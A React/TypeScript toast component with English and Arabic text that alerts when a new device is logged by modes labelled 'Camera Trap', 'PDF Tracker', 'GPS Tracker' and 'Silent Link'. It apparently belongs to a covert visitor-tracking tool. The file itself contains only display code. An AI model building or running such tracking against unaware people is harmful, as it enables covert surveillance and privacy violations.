import React from 'react';
import {
  Smartphone,
  Laptop,
  Globe,
  X,
} from 'lucide-react';
import { VisitRecord } from '../types';
import { Language } from '../translations';

export interface LiveDeviceAlertToastProps {
  visits: VisitRecord[];
  lang: Language;
  onDismiss: (visitId: string) => void;
  onViewDetails: (visit: VisitRecord) => void;
}

export const LiveDeviceAlertToast: React.FC<LiveDeviceAlertToastProps> = ({
  visits,
  lang,
  onDismiss,
  onViewDetails,
}) => {
  if (!visits || visits.length === 0) return null;

  const isAr = lang === 'ar';

  return (
    <div
      id="live-device-alert-toast-container"
      className="fixed bottom-4 right-4 z-50 flex flex-col gap-2 max-w-[280px] sm:max-w-[320px] w-full pointer-events-none"
      dir={isAr ? 'rtl' : 'ltr'}
    >
      {visits.slice(-1).map((visit) => {
        const isMobile =
          visit.os?.toLowerCase().includes('ios') ||
          visit.os?.toLowerCase().includes('android') ||
          visit.device?.toLowerCase().includes('mobile');

        const DeviceIcon = isMobile ? Smartphone : Laptop;

        const mode = visit.mode || 'camera';
        const isCamera = mode === 'camera';
        const isPdf = mode === 'pdf';
        const isPrecise = mode === 'precise';

        const sectionName = isCamera
          ? (isAr ? 'فخ الكاميرا' : 'Camera Trap')
          : isPdf
          ? (isAr ? 'تتبع PDF' : 'PDF Tracker')
          : isPrecise
          ? (isAr ? 'تتبع GPS' : 'GPS Tracker')
          : (isAr ? 'تتبع صامت' : 'Silent Link');

        return (
          <div
            key={visit.id}
            id={`device-alert-card-${visit.id}`}
            className="pointer-events-auto bg-white/95 text-slate-900 backdrop-blur rounded-lg border border-slate-200 shadow-sm p-3 transition-all duration-300 flex flex-col gap-2 ring-1 ring-black/5"
          >
            {/* Header: Section Name and Close */}
            <div className="flex items-center justify-between gap-2 border-b border-slate-100 pb-2">
              <span className="text-[10px] font-bold text-rose-600 uppercase tracking-wider">
                {sectionName}
              </span>
              <button
                type="button"
                onClick={() => onDismiss(visit.id)}
                className="p-1 rounded text-slate-400 hover:text-slate-600 hover:bg-slate-100 transition-colors shrink-0"
                aria-label="Dismiss"
              >
                <X className="w-3 h-3" />
              </button>
            </div>

            {/* Device and IP Details */}
            <div className="flex items-center gap-3 min-w-0">
              <div className="p-2 rounded-md bg-slate-100 text-slate-600 shrink-0">
                <DeviceIcon className="w-4 h-4" />
              </div>
              <div className="flex-1 min-w-0" style={{ textAlign: isAr ? 'right' : 'left' }}>
                <div className="flex flex-col gap-0.5">
                  <span className="text-xs font-bold text-rose-700">
                    {isAr ? 'جهاز جديد دخل قسم' : 'New device entered'} {sectionName}
                  </span>
                  <span className="text-xs font-semibold text-slate-900 truncate">
                    {visit.device || (isAr ? 'جهاز غير معروف' : 'Unknown Device')}
                  </span>
                </div>
              </div>
            </div>
          </div>
        );
      })}
    </div>
  );
};
